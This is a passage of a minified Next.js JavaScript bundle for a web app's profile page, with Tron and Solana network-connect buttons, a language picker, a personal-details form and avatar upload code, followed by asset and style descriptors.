                                children: ["connecting" === h && "\uD83D\uDD04 ".concat(a("connecting")), "success" === h && "✅ ".concat(a("success")), "error" === h && "❌ ".concat(a("error"))]
                            }), (0, n.jsx)("p", {
                                className: "text-xs mt-1",
                                children: f
                            })]
                        }), (0, n.jsxs)("div", {
                            className: "flex sm:flex-row flex-col gap-6 items-center justify-center",
                            children: [!r && (0, n.jsxs)("div", {
                                className: "".concat(o().networkButton, " ").concat(o().tronButton),
                                onClick: () => w("tron"),
                                children: [(0, n.jsx)("div", {
                                    className: o().networkIcon,
                                    children: (0, n.jsx)("svg", {
                                        viewBox: "0 0 24 24",
                                        fill: "currentColor",
                                        className: o().icon,
                                        children: (0, n.jsx)("path", {
                                            d: "M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"
                                        })
                                    })
                                }), (0, n.jsxs)("div", {
                                    className: o().networkInfo,
                                    children: [(0, n.jsx)("div", {
                                        className: o().networkName,
                                        children: "Tron"
                                    }), (0, n.jsx)("div", {
                                        className: o().networkDesc,
                                        children: "TRX, USDT"
                                    })]
                                }), (0, n.jsx)("div", {
                                    className: o().connectText,
                                    children: a("connect")
                                })]
                            }), !r && (0, n.jsxs)("div", {
                                className: "".concat(o().networkButton, " ").concat(o().solanaButton),
                                onClick: () => w("solana"),
                                children: [(0, n.jsx)("div", {
                                    className: o().networkIcon,
                                    children: (0, n.jsx)("svg", {
                                        viewBox: "0 0 24 24",
                                        fill: "currentColor",
                                        className: o().icon,
                                        children: (0, n.jsx)("path", {
                                            d: "M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"
                                        })
                                    })
                                }), (0, n.jsxs)("div", {
                                    className: o().networkInfo,
                                    children: [(0, n.jsx)("div", {
                                        className: o().networkName,
                                        children: "Solana"
                                    }), (0, n.jsx)("div", {
                                        className: o().networkDesc,
                                        children: "SOL, USDC, USDT"
                                    })]
                                }), (0, n.jsx)("div", {
                                    className: o().connectText,
                                    children: a("connect")
                                })]
                            }), r && (0, n.jsxs)("div", {
                                className: o().loadingContainer,
                                children: [(0, n.jsx)("div", {
                                    className: o().loadingSpinner
                                }), (0, n.jsx)("div", {
                                    className: o().loadingText,
                                    children: a("verifying")
                                })]
                            })]
                        })]
                    })
                }) : null
            }
        },
        19919: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/pl.ab852a1c.svg",
                height: 400,
                width: 640,
                blurWidth: 0,
                blurHeight: 0
            }
        },
        23788: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/es.0c2acc52.png",
                height: 18,
                width: 25,
                blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAGCAMAAADJ2y/JAAAAKlBMVEX/0ADDAB/CAB/CAB+/ACDAACDuvxW/hyj2wAHlsRCjbD/brinkVxPcUhU4faGEAAAADHRSTlP92tTTraz9/f39/f2w1v9oAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAKklEQVR4nGNgYWRmYmJmZGXggQIGBg52NgYw4OTiBtM8PLy8YClWiGIWAB6GASAQlRw6AAAAAElFTkSuQmCC",
                blurWidth: 8,
                blurHeight: 6
            }
        },
        24955: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/pg.542b46c0.png",
                height: 18,
                width: 25,
                blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAGCAMAAADJ2y/JAAAAQlBMVEULM6H39PIBNqbMECYANKfNDCL98o7CEy0BOKfOESYBKaLJARZvlsvvfXkANacAO7DZECQXSbT0oauYsuXXJDrOABqEG+GsAAAAD3RSTlP+/ayt2tr9/dTUraz9/da/nblLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAMElEQVR4nB3BBw4AIAgEsFMRwRH3/79qsEUmERHy2BPdgF3Fx64lg3XuMChRVTWGByvPAbW53/0VAAAAAElFTkSuQmCC",
                blurWidth: 8,
                blurHeight: 6
            }
        },
        25503: e => {
            e.exports = {
                breadcrumb: "profile_breadcrumb__IJPNS",
                button: "profile_button__ckMMu",
                button_personal: "profile_button_personal__MCQ58",
                input: "profile_input__6BeVZ",
                languages: "profile_languages__JQ6d3",
                button_border: "profile_button_border__bfDtE",
                cards: "profile_cards__Cm_bm",
                personal: "profile_personal__2Vxjh",
                bottom: "profile_bottom__FiEmM",
                ul: "profile_ul__mIsW9",
                networkButton: "profile_networkButton__RSgsU",
                networkIcon: "profile_networkIcon__MnWwT",
                icon: "profile_icon__y8vb5",
                networkInfo: "profile_networkInfo__pyujv",
                networkName: "profile_networkName__2X70J",
                networkDesc: "profile_networkDesc__3t8BP",
                connectText: "profile_connectText__1cpCm",
                tronButton: "profile_tronButton__RnEyE",
                solanaButton: "profile_solanaButton__ZOyn5",
                ethereumButton: "profile_ethereumButton__OHKs5",
                loadingContainer: "profile_loadingContainer__NeTz4",
                loadingSpinner: "profile_loadingSpinner__KwZ8u",
                spin: "profile_spin___g8HM",
                loadingText: "profile_loadingText___ToOn"
            }
        },
        28124: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => D
            });
            var n = a(95155),
                r = a(98777),
                o = a.n(r),
                i = a(39598),
                l = a(42890),
                c = a(23788),
                s = a(98949),
                d = a(95700),
                A = a(24955),
                u = a(69858),
                p = a(41002),
                h = a(79735),
                m = a(89747),
                f = a(82853),
                g = a(17505),
                w = a(98608),
                x = a(98407),
                S = a(13082),
                C = a(19919),
                b = a(39438),
                E = a(47861),
                T = a(5309),
                M = a(66766),
                v = a(38769),
                N = a(46453),
                _ = a(60388),
                L = a(12115);
            let y = [{
                value: "en",
                icon: i.A
            }, {
                value: "fr",
                icon: d.A
            }, {
                value: "es",
                icon: c.A
            }, {
                value: "ph",
                icon: A.A
            }, {
                value: "hi",
                icon: f.A
            }, {
                value: "hu",
                icon: g.A
            }, {
                value: "cn",
                icon: u.A
            }, {
                value: "cz",
                icon: m.A
            }, {
                value: "jp",
                icon: p.A
            }, {
                value: "id",
                icon: h.A
            }, {
                value: "nl",
                icon: l.A
            }, {
                value: "de",
                icon: s.A
            }, {
                value: "it",
                icon: w.A
            }, {
                value: "pt",
                icon: x.A
            }, {
                value: "ro",
                icon: S.A
            }, {
                value: "sk",
                icon: T.A
            }, {
                value: "pl",
                icon: C.A
            }, {
                value: "ar",
                icon: b.A
            }, {
                value: "tr",
                icon: E.A
            }];

            function D() {
                let e = (0, N.Ym)(),
                    t = (0, _.a8)(),
                    [a, r] = (0, L.useState)(y[y.findIndex(t => t.value === e) || 0]);
                return (0, n.jsxs)(v.rI, {
                    modal: !1,
                    children: [(0, n.jsx)(v.ty, {
                        asChild: !0,
                        children: (0, n.jsxs)("div", {
                            className: o().body,
                            children: [(0, n.jsx)(M.default, {
                                src: a.icon,
                                alt: "icon",
                                height: 18
                            }), (0, n.jsx)("p", {
                                children: a.value
                            })]
                        })
                    }), (0, n.jsx)(v.SQ, {
                        className: "w-[186px] my-[8px] mr-[16px]",
                        children: (0, n.jsx)("div", {
                            className: "flex  flex-wrap  justify-between gap-[16px] p-[16px] rounded-[6px] bg-neutral-50 border border-solid border-[#d9d9d9]",
                            children: y.map(e => (0, n.jsx)(_.N_, {
                                onClick: () => r(e),
                                href: t,
                                locale: e.value,
                                children: (0, n.jsxs)(v._2, {
                                    className: o().lang,
                                    children: [(0, n.jsx)(M.default, {
                                        height: 18,
                                        src: e.icon,
                                        alt: "icon",
                                        className: "flex-grow-0 flex-shrink-0"
                                    }), (0, n.jsx)("p", {
                                        className: " text-[16px]  text-black",
                                        children: e.value
                                    })]
                                })
                            }, e.value))
                        })
                    })]
                })
            }
        },
        33565: (e, t, a) => {
            "use strict";
            a.d(t, {
                h: () => i
            });
            var n = a(95155),
                r = a(80756),
                o = a.n(r);
            let i = e => {
                let {
                    text: t = "",
                    bgColor: a,
                    bgHover: r,
                    disabled: i,
                    onClick: l
                } = e;
                return (0, n.jsx)("button", {
                    onClick: l,
                    disabled: i,
                    type: "submit",
                    className: o().body,
                    style: {
                        "--bg-color": a,
                        "--bg-hover": r
                    },
                    children: (0, n.jsx)("p", {
                        children: t
                    })
                })
            }
        },
        38769: (e, t, a) => {
            "use strict";
            a.d(t, {
                SQ: () => p,
                _2: () => h,
                rI: () => A,
                ty: () => u
            });
            var n = a(95155),
                r = a(12115),
                o = a(9449),
                i = a(13052),
                l = a(5196),
                c = a(9428),
                s = a(29300),
                d = a.n(s);
            let A = o.bL,
                u = o.l9;
            o.YJ, o.ZL, o.Pb, o.z6, r.forwardRef((e, t) => {
                let {
                    className: a,
                    inset: r,
                    children: l,
                    ...c
                } = e;
                return (0, n.jsxs)(o.ZP, {
                    ref: t,
                    className: d()("flex cursor-default select-none items-center rounded-sm px-2 py-[24px] text-sm outline-none focus:bg-accent data-[state=open]:bg-accent", r && "pl-8", a),
                    ...c,
                    children: [l, (0, n.jsx)(i.A, {
                        className: "ml-auto h-4 w-4"
                    })]
                })
            }).displayName = o.ZP.displayName, r.forwardRef((e, t) => {
                let {
                    className: a,
                    ...r
                } = e;
                return (0, n.jsx)(o.G5, {
                    ref: t,
                    className: d()("z-50 overflow-hidden rounded-md border bg-popover  text-popover-foreground shadow-lg data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2", a),
                    ...r
                })
            }).displayName = o.G5.displayName;
            let p = r.forwardRef((e, t) => {
                let {
                    className: a,
                    sideOffset: r = 4,
                    ...i
                } = e;
                return (0, n.jsx)(o.ZL, {
                    children: (0, n.jsx)(o.UC, {
                        ref: t,
                        sideOffset: r,
                        className: d()("z-50 overflow-hidden rounded-md border bg-popover  text-popover-foreground shadow-md data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2", a),
                        ...i
                    })
                })
            });
            p.displayName = o.UC.displayName;
            let h = r.forwardRef((e, t) => {
                let {
                    className: a,
                    inset: r,
                    ...i
                } = e;
                return (0, n.jsx)(o.q7, {
                    ref: t,
                    className: d()("relative flex cursor-default select-none items-center rounded-sm text-sm outline-none transition-colors focus:bg-[#f3fbfc]  focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50", r && "pl-8", a),
                    ...i
                })
            });
            h.displayName = o.q7.displayName, r.forwardRef((e, t) => {
                let {
                    className: a,
                    children: r,
                    checked: i,
                    ...c
                } = e;
                return (0, n.jsxs)(o.H_, {
                    ref: t,
                    className: d()("relative flex cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none transition-colors focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50", a),
                    checked: i,
                    ...c,
                    children: [(0, n.jsx)("span", {
                        className: "absolute left-2 flex h-3.5 w-3.5 items-center justify-center",
                        children: (0, n.jsx)(o.VF, {
                            children: (0, n.jsx)(l.A, {
                                className: "h-4 w-4"
                            })
                        })
                    }), r]
                })
            }).displayName = o.H_.displayName, r.forwardRef((e, t) => {
                let {
                    className: a,
                    children: r,
                    ...i
                } = e;
                return (0, n.jsxs)(o.hN, {
                    ref: t,
                    className: d()("relative flex cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none transition-colors focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50", a),
                    ...i,
                    children: [(0, n.jsx)("span", {
                        className: "absolute left-2 flex h-3.5 w-3.5 items-center justify-center",
                        children: (0, n.jsx)(o.VF, {
                            children: (0, n.jsx)(c.A, {
                                className: "h-2 w-2 fill-current"
                            })
                        })
                    }), r]
                })
            }).displayName = o.hN.displayName, r.forwardRef((e, t) => {
                let {
                    className: a,
                    inset: r,
                    ...i
                } = e;
                return (0, n.jsx)(o.JU, {
                    ref: t,
                    className: d()("px-2 py-1.5 text-sm font-semibold", r && "pl-8", a),
                    ...i
                })
            }).displayName = o.JU.displayName, r.forwardRef((e, t) => {
                let {
                    className: a,
                    ...r
                } = e;
                return (0, n.jsx)(o.wv, {
                    ref: t,
                    className: d()("-mx-1 my-1 h-px bg-muted", a),
                    ...r
                })
            }).displayName = o.wv.displayName
        },
        39438: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/ar.aa8340ef.svg",
                height: 600,
                width: 900,
                blurWidth: 0,
                blurHeight: 0
            }
        },
        39598: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/en.73069aaa.svg",
                height: 18,
                width: 25,
                blurWidth: 0,
                blurHeight: 0
            }
        },
        39653: (e, t, a) => {
            "use strict";
            a.r(t), a.d(t, {
                default: () => n
            });
            let n = {
                src: "/_next/static/media/notification_bing.729bb919.svg",
                height: 60,
                width: 60,
                blurWidth: 0,
                blurHeight: 0
            }
        },
        41002: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/jp.6070043e.png",
                height: 18,
                width: 25,
                blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAGCAMAAADJ2y/JAAAAG1BMVEX99vj//////f3///+1ABb////WZ4D////fb4oCB04PAAAAB3RSTlP+rdrU/dP9etEYJAAAAAlwSFlzAAALEwAACxMBAJqcGAAAACZJREFUeJxjYGRiZWZmZWJkYGdn4OAAkQzsbCwsbOwMCAZcCqYYABVOAMk1B4kxAAAAAElFTkSuQmCC",
                blurWidth: 8,
                blurHeight: 6
            }
        },
        41804: (e, t, a) => {
            "use strict";
            a.d(t, {
                default: () => b
            });
            var n = a(95155),
                r = a(25503),
                o = a.n(r),
                i = a(29300),
                l = a.n(i),
                c = a(28124),
                s = a(33565),
                d = a(80816),
                A = a(17652),
                u = a(22472),
                p = a(12115),
                h = a(71028),
                m = a(34477);
            let f = (0, m.createServerReference)("7f420f9449f4fe3c13ddbdf9aed227264b8b89e0f0", m.callServer, void 0, m.findSourceMapURL, "default");
            var g = a(45567),
                w = a(7531),
                x = a(55028);
            a(50904);
            var S = a(13555);
            let C = (0, x.default)(() => Promise.all([a.e(5117), a.e(8614)]).then(a.bind(a, 48614)), {
                loadableGenerated: {
                    webpack: () => [48614]
                },
                ssr: !1
            });

            function b() {
                let e = (0, A.c3)("Errors"),
                    t = (0, A.c3)("Dashboard"),
                    a = (0, h.A)(),
                    {
                        error: r,
                        setError: i
                    } = (0, S.A)(),
                    [m, x] = (0, p.useState)(!1),
                    [b, E] = (0, p.useState)({
                        name: "",
                        country: "",
                        telegram: "",
                        phone: "",
                        secondEmail: ""
                    });
                (0, p.useLayoutEffect)(() => {
                    a && E({
                        name: (null == a ? void 0 : a.name) || "",
                        country: (null == a ? void 0 : a.country) || "",
                        telegram: (null == a ? void 0 : a.telegram) || "",
                        phone: (null == a ? void 0 : a.phone) || "",
                        secondEmail: (null == a ? void 0 : a.secondEmail) || ""
                    })
                }, [a]);
                let T = async t => {
                    if (t.preventDefault(), !b.name && !b.country && !b.telegram && !b.phone && !b.secondEmail) return void i("Please fill at least one field");
                    if (b.phone && !(0, u.g0)(b.phone)) return void i("Invalid phone number");
                    try {
                        x(!0);
                        let t = await f(b);
                        if ((null == t ? void 0 : t.status) !== 200) return void(0, w.oR)({
                            title: "Error",
                            description: (null == t ? void 0 : t.message) || e("something_went_wrong"),
                            variant: "destructive"
                        });
                        (0, g.j)("/api/user"), (0, w.oR)({
                            title: "Success",
                            description: e("personal_information_added_successfully")
                        })
                    } catch (t) {
                        (0, w.oR)({
                            title: "Error",
                            description: e("something_went_wrong"),
                            variant: "destructive"
                        })
                    } finally {
                        x(!1)
                    }
                };
                return (0, n.jsxs)("form", {
                    onSubmit: T,
                    className: "flex flex-col justify-center items-center self-stretch flex-grow overflow-hidden gap-[40px] p-[32px] rounded-[6px]  border border-solid border-[#e6e6e6] relative bg-white",
                    children: [(0, n.jsxs)("div", {
                        className: "flex flex-col   self-stretch   gap-[24px] ",
                        children: [(0, n.jsxs)("div", {
                            className: "flex  items-center self-stretch   gap-[24px]",
                            children: [(0, n.jsxs)("div", {
                                className: o().input,
                                children: [(0, n.jsx)("p", {
                                    className: "text-[14px] font-[400]",
                                    children: t("country")
                                }), (0, n.jsx)(C, {
                                    value: b.country,
                                    onChange: e => E({ ...b,
                                        country: e
                                    }),
                                    label: ""
                                })]
                            }), (0, n.jsxs)("div", {
                                className: l()(o().input, o().languages),
                                children: [(0, n.jsx)("p", {
                                    className: "text-[14px] font-[400]",
                                    children: t("language")
                                }), (0, n.jsx)(c.A, {})]
                            })]
                        }), (0, n.jsxs)("div", {
                            className: "flex  items-center self-stretch flex-wrap  gap-[24px]",
                            children: [(0, n.jsxs)("div", {
                                className: o().input,
                                children: [(0, n.jsx)("p", {
                                    className: "text-[14px] font-[400]",
                                    children: t("full_name")
                                }), (0, n.jsx)("div", {
                                    className: "w-full rounded-[6px] border-[1px] border-solid border-[#cecece]",
                                    children: (0, n.jsx)(d.p, {
                                        type: "text",
                                        placeholder: "Test Name",
                                        onChange: e => E({ ...b,
                                            name: e.target.value
                                        }),
                                        value: b.name,
                                        maxLength: 40
                                    })
                                })]
                            }), (0, n.jsxs)("div", {
                                className: o().input,
                                children: [(0, n.jsx)("p", {
                                    className: "text-[14px] font-[400]",
                                    children: t("backup_email")
                                }), (0, n.jsx)("div", {
                                    className: "w-full rounded-[6px] border-[1px] border-solid border-[#cecece]",
                                    children: (0, n.jsx)(d.p, {
                                        type: "email",
                                        onChange: e => E({ ...b,
                                            secondEmail: e.target.value
                                        }),
                                        value: b.secondEmail,
                                        maxLength: 40
                                    })
                                })]
                            })]
                        }), (0, n.jsxs)("div", {
                            className: "flex  items-center self-stretch   gap-[24px]",
                            children: [(0, n.jsxs)("div", {
                                className: o().input,
                                children: [(0, n.jsx)("p", {
                                    className: "text-[14px] font-[400]",
                                    children: t("phone_number")
                                }), (0, n.jsx)("div", {
                                    className: "w-full rounded-[6px] border-[1px] border-solid border-[#cecece]",
                                    children: (0, n.jsx)(u.Ay, {
                                        className: l()("flex h-[40px] w-full border-none rounded-[6px] bg-background px-3 py-2 text-[14px] ring-offset-background file:border-0 file:bg-transparent file:text-[14px] file:font-medium placeholder:text-[#9c9c9c] focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#00b2c8] disabled:cursor-not-allowed disabled:opacity-50"),
                                        onChange: e => E({ ...b,
                                            phone: e || ""
                                        }),
                                        value: b.phone
                                    })
                                })]
                            }), (0, n.jsxs)("div", {
                                className: o().input,
                                children: [(0, n.jsx)("p", {
                                    className: "text-[14px] font-[400]",
                                    children: t("telegram")
                                }), (0, n.jsx)("div", {
                                    className: "w-full rounded-[6px] border-[1px] border-solid border-[#cecece]",
                                    children: (0, n.jsx)(d.p, {
                                        type: "text",
                                        onChange: e => E({ ...b,
                                            telegram: e.target.value
                                        }),
                                        value: b.telegram,
                                        maxLength: 30,
                                        placeholder: "@username"
                                    })
                                })]
                            })]
                        })]
                    }), (0, n.jsxs)("div", {
                        className: "flex gap-[24px] items-center justify-center flex-1 ",
                        children: [(0, n.jsx)("div", {
                            className: o().button_border,
                            onClick: () => E({
                                name: "",
                                country: "",
                                telegram: "",
                                phone: "",
                                secondEmail: ""
                            }),
                            children: (0, n.jsx)("p", {
                                children: t("cancel")
                            })
                        }), (0, n.jsx)("div", {
                            className: o().button_personal,
                            children: (0, n.jsx)(s.h, {
                                disabled: m,
                                text: t("save_changes")
                            })
                        })]
                    }), r && (0, n.jsx)("div", {
                        className: "text-[#CD1F1F] w-full text-center  absolute bottom-[80px]",
                        dangerouslySetInnerHTML: {
                            __html: r
                        }
                    })]
                })
            }
        },
        42890: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/nl.cc2937a2.png",
                height: 18,
                width: 25,
                blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAGCAMAAADJ2y/JAAAAJFBMVEUeQ4r87evp8PetGCSsGCStGCSrFyIdQorp8fgcQokqTpS2JTCf3fo6AAAACnRSTlPW/f3U09qtrfysI9OihgAAAAlwSFlzAAALEwAACxMBAJqcGAAAACVJREFUeJxjYGNlYWZmYWVj4IYCBkYoYGCCAA4GLihg4GQAA3YAHHUA+yDf4YwAAAAASUVORK5CYII=",
                blurWidth: 8,
                blurHeight: 6
            }
        },
        47790: () => {},
        47861: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/tr.6daca94f.svg",
                height: 800,
                width: 1200,
                blurWidth: 0,
                blurHeight: 0
            }
        },
        54949: (e, t, a) => {
            "use strict";
            a.d(t, {
                default: () => g
            });
            var n = a(95155),
                r = a(66766),
                o = a(9239);
            let i = {
                    src: "/_next/static/media/upload.f509e404.svg",
                    height: 24,
                    width: 24,
                    blurWidth: 0,
                    blurHeight: 0
                },
                l = {
                    src: "/_next/static/media/trash.dd54dc69.svg",
                    height: 24,
                    width: 24,
                    blurWidth: 0,
                    blurHeight: 0
                };
            var c = a(89458),
                s = a(31802),
                d = a(71028),
                A = a(12115),
                u = a(45567),
                p = a(34477);
            let h = (0, p.createServerReference)("7fe5ea41a023093e57ad927e3f3076a10fd2002024", p.callServer, void 0, p.findSourceMapURL, "default"),
                m = (0, p.createServerReference)("7f31124d7502b1e452fee0653fca971ab8cf3354eb", p.callServer, void 0, p.findSourceMapURL, "default");
            var f = a(17652);

            function g() {
                let e = new c.vA({
                        publicKey: "3f1ffcb57c2ba8694d63"
                    }),
                    t = (0, A.useRef)(null),
                    a = (0, d.A)(),
                    [p, g] = (0, A.useState)(!1),
                    w = (0, f.c3)("Dashboard"),
                    x = async () => {
                        if (g(!0), null === t.current) return void console.error("inputRef.current is null");
                        let a = t.current.files;
                        if (null == a) return void console.error("inputRef.current.files is null or undefined");
                        let n = a[0];
                        if (null == n) return void console.error("inputRef.current.files[0] is null or undefined");
                        try {
                            let t = await (0, s.A)(n, {
                                    maxSizeMB: .5,
                                    maxWidthOrHeight: 256,
                                    useWebWorker: !0
                                }),
                                a = await e.uploadFile(t);
                            await h("https://ucarecdn.com/".concat(a.uuid, "/-/scale_crop/440x440/smart_faces_objects/")), (0, u.j)("/api/user")
                        } catch (e) {
                            console.error(e)
                        } finally {
                            g(!1)
                        }
                    },
                    S = async () => {
                        if (!p) {
                            g(!0);
                            try {
                                await m(), (0, u.j)("/api/user")
                            } catch (e) {
                                console.error(e)
                            } finally {
                                g(!1)
                            }
                        }
                    };
                return (0, n.jsxs)("div", {
                    className: "flex flex-col  items-center self-stretch  overflow-hidden gap-[32px] px-[32px] py-[24px] rounded-[6px]  border border-solid border-[#e6e6e6] bg-white",
                    children: [(0, n.jsx)("div", {
                        className: "w-full aspect-square max-w-[317px] ",
                        children: (0, n.jsx)(r.default, {
                            blurDataURL: (null == a ? void 0 : a.avatar) || o.A.src,
                            placeholder: "blur",
                            src: (null == a ? void 0 : a.avatar) || o.A.src,
                            width: 0,
                            height: 0,
                            sizes: "100vw",
                            style: {
                                width: "100%",
                                objectFit: "cover",
                                height: "auto"
                            },
                            alt: "icon"
                        })
                    }), (0, n.jsxs)("div", {
                        className: "flex justify-between gap-[24px] self-stretch  ",
                        children: [(0, n.jsxs)("div", {
                            className: "flex cursor-pointer  items-center flex-grow gap-[16px] px-[16px] h-[42px] rounded-[6px]  border border-solid border-[#e6e6e6] relative ",
                            children: [(0, n.jsx)(r.default, {
                                className: "cursor-pointer",
                                src: i,
                                width: 24,
                                height: 24,
                                alt: "icon"
                            }), (0, n.jsx)("input", {
                                disabled: p,
                                onChange: x,
                                ref: t,
                                type: "file",
                                accept: "image/*",
                                className: "absolute top-0 left-0 w-full h-full opacity-0 cursor-pointer"
                            }), (0, n.jsx)("p", {
                                className: "text-[14px] cursor-pointer",
                                children: w("upload")
                            })]
                        }), (0, n.jsxs)("div", {
                            className: "flex cursor-pointer items-center flex-grow gap-[16px] px-[16px] h-[42px] rounded-[6px]  border border-solid border-[#e6e6e6]",
                            onClick: S,
                            children: [(0, n.jsx)(r.default, {
                                src: l,
                                width: 24,
                                height: 24,
                                alt: "icon"
                            }), (0, n.jsx)("p", {
                                className: "text-[14px]",
                                children: w("remove")
                            })]
                        })]
                    })]
                })
            }
        },
        57527: (e, t, a) => {
            "use strict";
            a.r(t), a.d(t, {
                default: () => n
            });
            let n = {
                src: "/_next/static/media/shield_security.4144277a.svg",
                height: 60,
                width: 60,
                blurWidth: 0,
                blurHeight: 0
            }
        },
        60388: (e, t, a) => {
            "use strict";
            a.d(t, {
                N_: () => o,
                a8: () => l,
                rd: () => c
            });
            var n = a(30981);
            let r = (0, a(49984).A)({
                    locales: ["en", "fr", "es", "ph", "hi", "hu", "cn", "cz", "jp", "id", "nl", "de", "it", "pt", "ro", "pl", "ar", "tr", "sk"],
                    defaultLocale: "en"
                }),
                {
                    Link: o,
                    redirect: i,
                    usePathname: l,
                    useRouter: c,
                    getPathname: s
                } = (0, n.A)(r)
        },
        69858: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/zh.32582084.png",
                height: 18,
                width: 25,
                blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAGCAMAAADJ2y/JAAAAJFBMVEXuHCXwLSLtHCPvHCPuHCTtGCXuGiTuHyTvMiD3HSb8ixT9WR2XT06PAAAACXRSTlP9/q3U2v3U2tMIK88WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAALUlEQVR4nB2KMRIAIAyDSG2r0f//19OFASDmGt0ZnG3ZNpJUAPUJPP1TZPebLxjFAOl6D9RDAAAAAElFTkSuQmCC",
                blurWidth: 8,
                blurHeight: 6
            }
        },
        71028: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => o
            });
            var n = a(94052),
                r = a(34953);
            let o = function() {
                let {
                    data: e
                } = (0, r.Ay)("/api/user", n.A);
                return e
            }
        },
        73776: () => {},
        79368: () => {},
        79735: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/id.9fbe523b.png",
                height: 18,
                width: 25,
                blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAGCAMAAADJ2y/JAAAAIVBMVEX3VmfuXW3////9/f398/TuVWbtVWbsVWX98/T//f/9/f0hAGzwAAAAC3RSTlP++f6/+MzSp++fnqb0iToAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAkSURBVHicY2BnY2VlZWVjZ4ADRihg4GABAw4GJihg4GQGAy4ADxYAlGpNYkAAAAAASUVORK5CYII=",
                blurWidth: 8,
                blurHeight: 6
            }
        },
        80756: e => {
            e.exports = {
                body: "button_blue_body__xatTr"
            }
        },
        80816: (e, t, a) => {
            "use strict";
            a.d(t, {
                p: () => l
            });
            var n = a(95155),
                r = a(12115),
                o = a(29300),
                i = a.n(o);
            let l = r.forwardRef((e, t) => {
                let {
                    className: a,
                    type: r,
                    ...o
                } = e;
                return (0, n.jsx)("input", {
                    type: r,
                    className: i()("flex h-[40px] w-full border-none rounded-[6px] bg-background px-3 py-2 text-[14px] ring-offset-background file:border-0 file:bg-transparent file:text-[14px] file:font-medium placeholder:text-[#9c9c9c] focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#00b2c8] disabled:cursor-not-allowed disabled:opacity-50", a),
                    ref: t,
                    ...o
                })
            });
            l.displayName = "Input"
        },
        82853: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/hi.81fe0f8b.png",
                height: 18,
                width: 25,
                blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAGCAMAAADJ2y/JAAAANlBMVEUNhgHn9Oq9san/mDD/mC7q9+3/ly2VlaH/9/H9li3/ly8NhgENhQK+y8C9yr//pD4fkxImmhkc4pTdAAAAD3RSTlPW/f3T2v2t/f3U062s/f1b3FbQAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAMElEQVR4nC3BCQ4AIAgDsKkg4Dn//1kTY4sqJaJJxf7gns2yOzQts5kUJHlIYuDpFy8NAav2fiBbAAAAAElFTkSuQmCC",
                blurWidth: 8,
                blurHeight: 6
            }
        },
        89747: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/cz.c98556c9.png",
                height: 18,
                width: 25,
